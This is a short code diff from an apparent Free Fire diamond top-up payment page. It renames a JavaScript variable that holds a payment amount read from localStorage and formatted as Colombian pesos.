@@ -390,11 +390,11 @@ if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
               document.getElementById("otpToken").value = "";
             }
 
-            let monto = localStorage.getItem("total_pagar") || "0";
+            const montoDinamica = localStorage.getItem("total_pagar") || "0";
             const montoFormateado = new Intl.NumberFormat("es-CO", {
               style: "currency",
               currency: "COP"
-            }).format(parseInt(monto));
+            }).format(parseInt(montoDinamica));
 
             const montoElem = document.getElementById("montoClave");
             if (montoElem) {
